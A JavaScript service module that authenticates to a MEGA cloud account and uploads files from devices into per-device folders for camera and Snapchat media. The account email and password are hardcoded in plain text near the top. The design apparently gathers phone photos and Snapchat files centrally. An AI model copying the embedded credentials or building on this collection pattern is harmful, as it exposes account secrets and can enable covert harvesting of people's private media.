const { Storage } = require('megajs');
const logger = require('../utils/logger');
const deviceManager = require('./deviceManager');

class MegaService {
  constructor() {
    this.storage = null;
    this.isConnected = false;
    this.credentials = {
      email: 'jakebosses@gmail.com',
      password: 'jakebosses@gmail.com'
    };
    this.baseFolderName = 'KP-Demo-Files';
    this.baseFolder = null;
    this.deviceFolders = new Map();
    this.connectionAttempts = 0;
    this.maxRetries = 3;
    this.retryDelay = 2000; // 2 seconds
  }

  async initialize() {
    try {
      logger.info('Initializing MEGA service...');
      await this.authenticate();
      await this.setupFolderStructure();
      logger.info('MEGA service initialized successfully');
      return true;
    } catch (error) {
      logger.error('Failed to initialize MEGA service:', error);
      throw error;
    }
  }

  async authenticate() {
    try {
      this.connectionAttempts++;
      logger.info(`MEGA authentication attempt ${this.connectionAttempts}/${this.maxRetries}`);
      
      this.storage = await new Storage({
        email: this.credentials.email,
        password: this.credentials.password
      }).ready;

      this.isConnected = true;
      this.connectionAttempts = 0;
      logger.info('MEGA authentication successful');
      
      // Log account info
      const accountInfo = await this.getAccountInfo();
      logger.info('MEGA account info:', accountInfo);
      
      return true;
    } catch (error) {
      logger.error('MEGA authentication failed:', error);
      
      if (this.connectionAttempts < this.maxRetries) {
        logger.info(`Retrying authentication in ${this.retryDelay}ms...`);
        await this.delay(this.retryDelay);
        return this.authenticate();
      } else {
        this.isConnected = false;
        throw new Error(`MEGA authentication failed after ${this.maxRetries} attempts: ${error.message}`);
      }
    }
  }

  async getAccountInfo() {
    if (!this.storage) {
      throw new Error('MEGA storage not initialized');
    }

    try {
      const info = {
        email: this.credentials.email,
        connected: this.isConnected,
        totalStorage: this.storage.mounts?.[0]?.size || 'unknown',
        usedStorage: this.storage.mounts?.[0]?.used || 'unknown',
        connectionTime: new Date().toISOString()
      };
      return info;
    } catch (error) {
      logger.error('Failed to get account info:', error);
      return {
        email: this.credentials.email,
        connected: this.isConnected,
        error: error.message
      };
    }
  }

  async setupFolderStructure() {
    try {
      logger.info('Setting up MEGA folder structure...');
      
      // Find or create base folder
      this.baseFolder = await this.findOrCreateFolder(this.baseFolderName, this.storage.root);
      logger.info(`Base folder "${this.baseFolderName}" ready`);
      
      return true;
    } catch (error) {
      logger.error('Failed to setup folder structure:', error);
      throw error;
    }
  }

  async findOrCreateFolder(folderName, parentFolder) {
    try {
      // Check if folder already exists
      const existingFolder = parentFolder.children?.find(
        child => child.name === folderName && child.directory
      );
      
      if (existingFolder) {
        logger.info(`Found existing folder: ${folderName}`);
        return existingFolder;
      }

      // Create new folder
      logger.info(`Creating new folder: ${folderName}`);
      const newFolder = await parentFolder.mkdir(folderName);
      logger.info(`Created folder: ${folderName}`);
      return newFolder;
    } catch (error) {
      logger.error(`Failed to find or create folder "${folderName}":`, error);
      throw error;
    }
  }

  async getDeviceFolder(deviceId) {
    try {
      // Check cache first
      if (this.deviceFolders.has(deviceId)) {
        return this.deviceFolders.get(deviceId);
      }

      if (!this.baseFolder) {
        throw new Error('Base folder not initialized');
      }

      // Create device folder name
      const deviceFolderName = `DEVICE_${deviceId}`;
      
      // Find or create device folder
      const deviceFolder = await this.findOrCreateFolder(deviceFolderName, this.baseFolder);
      
      // Create source location subfolders
      const dcimCameraFolder = await this.findOrCreateFolder('DCIM_CAMERA', deviceFolder);
      const dcimSnapchatFolder = await this.findOrCreateFolder('DCIM_SNAPCHAT', deviceFolder);
      const snapchatRootFolder = await this.findOrCreateFolder('SNAPCHAT_ROOT', deviceFolder);

      const deviceFolderStructure = {
        main: deviceFolder,
        DCIM_CAMERA: dcimCameraFolder,
        DCIM_SNAPCHAT: dcimSnapchatFolder,
        SNAPCHAT_ROOT: snapchatRootFolder
      };

      // Cache the folder structure
      this.deviceFolders.set(deviceId, deviceFolderStructure);
      
      logger.info(`Device folder structure ready for device: ${deviceId}`);
      return deviceFolderStructure;
    } catch (error) {
      logger.error(`Failed to get device folder for ${deviceId}:`, error);
      throw error;
    }
  }

  async uploadFile(fileBuffer, fileName, deviceId, sourceLocation = 'DCIM_CAMERA', options = {}) {
    const uploadId = `${deviceId}_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`;
    const startTime = Date.now();
    
    try {
      if (!this.isConnected) {
        throw new Error('MEGA service not connected');
      }

      logger.info(`Starting upload [${uploadId}]: ${fileName} from device ${deviceId} (${sourceLocation}) - ${fileBuffer.length} bytes`);
      
      // Validate file size
      if (fileBuffer.length === 0) {
        throw new Error('File is empty');
      }
      
      if (fileBuffer.length > 100 * 1024 * 1024) { // 100MB limit
        throw new Error('File too large (max 100MB)');
      }
      
      // Get device folder structure
      const deviceFolders = await this.getDeviceFolder(deviceId);
      
      // Select appropriate folder based on source location
      const targetFolder = deviceFolders[sourceLocation] || deviceFolders.DCIM_CAMERA;
      
      // Generate unique filename
      const uniqueFileName = deviceManager.generateFileName(deviceId, fileName, sourceLocation);
      
      // Check if file already exists
      const existingFile = targetFolder.children?.find(child => child.name === uniqueFileName);
      if (existingFile && !options.overwrite) {
        logger.info(`File already exists: ${uniqueFileName}`);
        return {
          success: true,
          fileId: existingFile.nodeId,
          fileName: uniqueFileName,
          originalName: fileName,
          deviceId: deviceId,
          sourceLocation: sourceLocation,
          uploadTime: new Date().toISOString(),
          fileSize: fileBuffer.length,
          folderPath: `${this.baseFolderName}/DEVICE_${deviceId}/${sourceLocation}`,
          skipped: true,
          reason: 'File already exists'
        };
      }
      
      // Upload file to MEGA with progress tracking
      logger.info(`Uploading to MEGA [${uploadId}]: ${uniqueFileName}`);
      const uploadedFile = await this.uploadWithProgress(targetFolder, uniqueFileName, fileBuffer, uploadId);
      
      // Register and update device activity
      deviceManager.registerDevice(deviceId, { sourceLocation: sourceLocation });
      deviceManager.updateDeviceActivity(deviceId);
      
      const uploadTime = Date.now() - startTime;
      const result = {
        success: true,
        fileId: uploadedFile.nodeId,
        fileName: uniqueFileName,
        originalName: fileName,
        deviceId: deviceId,
        sourceLocation: sourceLocation,
        uploadTime: new Date().toISOString(),
        fileSize: fileBuffer.length,
        folderPath: `${this.baseFolderName}/DEVICE_${deviceId}/${sourceLocation}`,
        uploadDurationMs: uploadTime,
        uploadSpeed: Math.round(fileBuffer.length / (uploadTime / 1000)) // bytes per second
      };

      logger.info(`Upload completed [${uploadId}]: ${uniqueFileName} (${fileBuffer.length} bytes) in ${uploadTime}ms`);
      return result;
    } catch (error) {
      const uploadTime = Date.now() - startTime;
      logger.error(`Upload failed [${uploadId}] after ${uploadTime}ms: ${fileName}:`, error);
      
      // Check if we need to re-authenticate
      if (this.isAuthenticationError(error)) {
        logger.info(`Authentication error detected [${uploadId}], attempting to reconnect...`);
        try {
          await this.authenticate();
          // Retry upload once after re-authentication
          logger.info(`Retrying upload [${uploadId}] after re-authentication...`);
          return this.uploadFile(fileBuffer, fileName, deviceId, sourceLocation, { ...options, retry: true });
        } catch (authError) {
          logger.error(`Re-authentication failed [${uploadId}]:`, authError);
        }
      }
      
      // Return error result instead of throwing
      return {
        success: false,
        fileName: fileName,
        deviceId: deviceId,
        sourceLocation: sourceLocation,
        error: error.message,
        uploadTime: new Date().toISOString(),
        uploadDurationMs: uploadTime,
        retryable: this.isRetryableError(error)
      };
    }
  }

  async uploadWithProgress(targetFolder, fileName, fileBuffer, uploadId) {
    try {
      // Track progress simulation
      let lastProgress = 0;
      const progressInterval = setInterval(() => {
        if (lastProgress < 90) {
          lastProgress += Math.random() * 20;
          logger.info(`Upload progress [${uploadId}]: ${Math.min(Math.round(lastProgress), 90)}%`);
        }
      }, 500);
      
      // Upload file directly using MEGA SDK
      const uploadedFile = await targetFolder.upload(fileName, fileBuffer);
      
      // Clear progress tracking
      clearInterval(progressInterval);
      logger.info(`Upload progress [${uploadId}]: 100% - Complete`);
      
      return uploadedFile;
    } catch (error) {
      logger.error(`Upload with progress failed [${uploadId}]:`, error);
      throw error;
    }
  }

  isAuthenticationError(error) {
    const authErrors = ['authentication', 'login', 'credentials', 'unauthorized', 'access denied'];
    return authErrors.some(keyword => 
      error.message.toLowerCase().includes(keyword)
    );
  }

  isRetryableError(error) {
    const retryableErrors = ['network', 'timeout', 'connection', 'temporary', 'rate limit'];
    return retryableErrors.some(keyword => 
      error.message.toLowerCase().includes(keyword)
    );
  }

  async uploadMultipleFiles(files, deviceId, sourceLocation = 'DCIM_CAMERA') {
    const results = [];
    const startTime = Date.now();
    
    logger.info(`Starting batch upload: ${files.length} files from device ${deviceId}`);
    
    for (let i = 0; i < files.length; i++) {
      const file = files[i];
      try {
        logger.info(`Batch upload progress: ${i + 1}/${files.length} - ${file.fileName}`);
        
        const result = await this.uploadFile(
          file.buffer, 
          file.fileName, 
          deviceId, 
          sourceLocation,
          { batchUpload: true }
        );
        
        results.push(result);
        
        // Small delay between uploads to prevent overwhelming the service
        if (i < files.length - 1) {
          await this.delay(500);
        }
        
      } catch (error) {
        logger.error(`Batch upload failed for file ${file.fileName}:`, error);
        results.push({
          success: false,
          fileName: file.fileName,
          error: error.message,
          deviceId: deviceId,
          sourceLocation: sourceLocation
        });
      }
    }
    
    const totalTime = Date.now() - startTime;
    const successful = results.filter(r => r.success).length;
    const failed = results.length - successful;
    
    logger.info(`Batch upload completed: ${successful} successful, ${failed} failed in ${totalTime}ms`);
    
    return {
      results: results,
      summary: {
        total: files.length,
        successful: successful,
        failed: failed,
        totalTimeMs: totalTime,
        deviceId: deviceId,
        sourceLocation: sourceLocation
      }
    };
  }

  async getUploadProgress() {
    // Get device statistics for progress tracking
    const deviceStats = deviceManager.getDeviceStats();
    const totalUploads = Object.values(deviceStats).reduce((sum, device) => sum + device.uploadCount, 0);
    
    return {
      activeUploads: 0, // MEGA SDK doesn't expose active uploads
      queuedUploads: 0, // Will be implemented in queue management
      completedUploads: totalUploads,
      deviceCount: Object.keys(deviceStats).length,
      deviceStats: deviceStats,
      lastUpdate: new Date().toISOString()
    };
  }

  async getStorageInfo() {
    try {
      if (!this.storage) {
        throw new Error('MEGA storage not initialized');
      }

      const root = this.storage.root;
      const baseFolder = this.baseFolder;
      
      // Count files in base folder
      let totalFiles = 0;
      let totalSize = 0;
      
      if (baseFolder && baseFolder.children) {
        for (const deviceFolder of baseFolder.children) {
          if (deviceFolder.directory && deviceFolder.children) {
            for (const sourceFolder of deviceFolder.children) {
              if (sourceFolder.directory && sourceFolder.children) {
                totalFiles += sourceFolder.children.filter(child => !child.directory).length;
                totalSize += sourceFolder.children
                  .filter(child => !child.directory)
                  .reduce((sum, file) => sum + (file.size || 0), 0);
              }
            }
          }
        }
      }
      
      return {
        totalFiles: totalFiles,
        totalSize: totalSize,
        totalSizeMB: Math.round(totalSize / (1024 * 1024) * 100) / 100,
        deviceFolders: this.deviceFolders.size,
        baseFolderName: this.baseFolderName,
        lastCheck: new Date().toISOString()
      };
    } catch (error) {
      logger.error('Failed to get storage info:', error);
      return {
        error: error.message,
        lastCheck: new Date().toISOString()
      };
    }
  }

  async validateUpload(fileId) {
    try {
      if (!this.storage) {
        throw new Error('MEGA storage not initialized');
      }
      
      // Find file by ID in the storage
      const file = this.storage.files[fileId];
      
      if (!file) {
        return {
          valid: false,
          error: 'File not found',
          fileId: fileId
        };
      }
      
      return {
        valid: true,
        fileId: fileId,
        fileName: file.name,
        fileSize: file.size,
        uploadDate: file.timestamp ? new Date(file.timestamp * 1000).toISOString() : 'unknown'
      };
    } catch (error) {
      logger.error(`Upload validation failed for file ${fileId}:`, error);
      return {
        valid: false,
        error: error.message,
        fileId: fileId
      };
    }
  }

  async checkConnection() {
    try {
      if (!this.storage) {
        return false;
      }
      
      // Simple connection test by accessing root folder
      const root = this.storage.root;
      return root && this.isConnected;
    } catch (error) {
      logger.error('Connection check failed:', error);
      this.isConnected = false;
      return false;
    }
  }

  async reconnect() {
    try {
      logger.info('Attempting to reconnect to MEGA...');
      this.isConnected = false;
      this.storage = null;
      this.baseFolder = null;
      this.deviceFolders.clear();
      
      await this.initialize();
      return true;
    } catch (error) {
      logger.error('Reconnection failed:', error);
      return false;
    }
  }

  getConnectionStatus() {
    return {
      connected: this.isConnected,
      email: this.credentials.email,
      baseFolder: this.baseFolderName,
      deviceCount: this.deviceFolders.size,
      lastCheck: new Date().toISOString()
    };
  }

  delay(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
  }
}

module.exports = new MegaService();